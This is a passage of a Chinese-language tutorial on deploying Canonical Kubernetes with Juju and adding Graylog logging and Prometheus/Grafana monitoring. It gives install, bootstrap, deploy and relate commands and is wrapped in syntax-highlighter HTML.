yaml grafana/0 | grep public-address\r\n public-address: &lt;your-grafana-ip&gt;\r\njuju run-action --wait grafana/0 get-admin-password\r\n password: &lt;your-grafana-password&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8be0589064741-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8be0589064741-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8be0589064741-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8be0589064741-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8be0589064741-1\"><span class=\"crayon-e\">juju </span><span class=\"crayon-v\">status</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">format </span><span class=\"crayon-e\">yaml </span><span class=\"crayon-v\">grafana</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">grep </span><span class=\"crayon-m\">public</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">address</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8be0589064741-2\"><span class=\"crayon-e\"> </span><span class=\"crayon-m\">public</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">address</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">your</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">grafana</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ip</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8be0589064741-3\"><span class=\"crayon-e\">juju </span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">action</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">wait </span><span class=\"crayon-v\">grafana</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">admin</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">password</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8be0589064741-4\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">your</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">grafana</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">password</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>在浏览器中输入 <code>http://&lt;your-grafana-ip&gt;:3000</code>，输入管理员用户（admin）和密码（&lt;your-grafana-password&gt;）登入。成功登入后，点击 “Home” 下拉框，选取 “Kubernetes Metrics (via Prometheus)” 去查看集群指标仪表板：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/76a0a9d93a75c76c8033b51957615741.png\" alt=\"\"></p>\n<p>我们也可以通过下拉框切换到 “Node Metrics (via Telegraf) ” 去查看 K8s 主机的系统指标。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/a708ae229aeffef775184db190b97c95.png\" alt=\"\"></p>\n<h3 id=\"toc_4\">另一种方法</h3>\n<p>正如在文章开始的介绍中提到的，我喜欢用 <code>conjure-up</code> 的向导去完成像 Kubernetes 这种复杂软件的部署。现在，我们来看一下 <code>conjure-up</code> 的另一种方法，你可能希望去看到实现相同结果的一些命令行的方法。还有其它的可能已经部署了前面的 CDK，并想去扩展使用上述的 Graylog/Prometheus 组件。不管什么原因你既然看到这了，既来之则安之，继续向下看吧。</p>\n<p>支持 <code>conjure-up</code> 的工具是 <a href=\"https://jujucharms.com/\">Juju</a>。CDK spell 所做的一切，都可以使用 <code>juju</code> 命令行来完成。我们来看一下，如何一步步完成这些工作。</p>\n<h4 id=\"toc_5\">从 Scratch 中启动</h4>\n<p>如果你使用的是 Linux，安装 Juju 很简单，命令如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8be5575069096\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo snap install juju --classic\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8be5575069096-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8be5575069096-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8be5575069096-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">snap </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">juju</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">classic</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8be5575069096-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>对于 macOS，Juju 也可以从 brew 中安装：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8be8401567397\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbrew install juju\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8be8401567397-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8be8401567397-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8be8401567397-1\"><span class=\"crayon-e\">brew </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">juju</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8be8401567397-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>现在为你选择的云配置一个控制器。你或许会被提示请求一个凭据（用户名密码）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8bed028942564\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\njuju bootstrap\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bed028942564-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bed028942564-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bed028942564-1\"><span class=\"crayon-e\">juju </span><span class=\"crayon-i\">bootstrap</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bed028942564-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>我们接下来需要基于 CDK 捆绑部署：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8bf2121364051\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\njuju deploy canonical-kubernetes\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bf2121364051-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bf2121364051-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bf2121364051-1\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">deploy </span><span class=\"crayon-v\">canonical</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">kubernetes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bf2121364051-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h4 id=\"toc_6\">从 CDK 开始</h4>\n<p>使用我们部署的 Kubernetes 集群，我们需要去添加 Graylog 和 Prometheus 所需要的全部应用程序：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8bf7782036589\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n## deploy graylog-related applications\r\njuju deploy xenial/apache2\r\njuju deploy xenial/elasticsearch\r\njuju deploy xenial/filebeat\r\njuju deploy xenial/graylog\r\njuju deploy xenial/mongodb\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bf7782036589-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bf7782036589-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bf7782036589-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bf7782036589-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bf7782036589-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bf7782036589-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bf7782036589-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bf7782036589-1\"><span class=\"crayon-p\">## deploy graylog-related applications</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bf7782036589-2\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">deploy </span><span class=\"crayon-v\">xenial</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">apache2</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bf7782036589-3\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">deploy </span><span class=\"crayon-v\">xenial</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">elasticsearch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bf7782036589-4\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">deploy </span><span class=\"crayon-v\">xenial</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">filebeat</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bf7782036589-5\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">deploy </span><span class=\"crayon-v\">xenial</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">graylog</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bf7782036589-6\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">deploy </span><span class=\"crayon-v\">xenial</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">mongodb</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bf7782036589-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8bfb639693819\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n## deploy prometheus-related applications\r\njuju deploy xenial/grafana\r\njuju deploy xenial/prometheus\r\njuju deploy xenial/telegraf\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bfb639693819-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bfb639693819-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bfb639693819-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bfb639693819-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bfb639693819-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bfb639693819-1\"><span class=\"crayon-p\">## deploy prometheus-related applications</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bfb639693819-2\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">deploy </span><span class=\"crayon-v\">xenial</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">grafana</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bfb639693819-3\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">deploy </span><span class=\"crayon-v\">xenial</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">prometheus</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bfb639693819-4\"><span class=\"crayon-e\">juju </span><span class=\"crayon-e\">deploy </span><span class=\"crayon-v\">xenial</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">telegraf</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bfb639693819-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>现在软件已经部署完毕，将它们连接到一起，以便于它们之间可以相互通讯：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8bfe550872623\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n## relate graylog applications\r\njuju relate apache2:reverseproxy graylog:website\r\njuju relate graylog:elasticsearch elasticsearch:client\r\njuju relate graylog:mongodb mongodb:database\r\njuju relate filebeat:beats-host kubernetes-master:juju-info\r\njuju relate filebeat:beats-host kubernetes-worker:jujuu-info\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bfe550872623-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bfe550872623-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bfe550872623-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bfe550872623-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bfe550872623-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bfe550872623-6\">6</div><div class=\"crayon-num\" 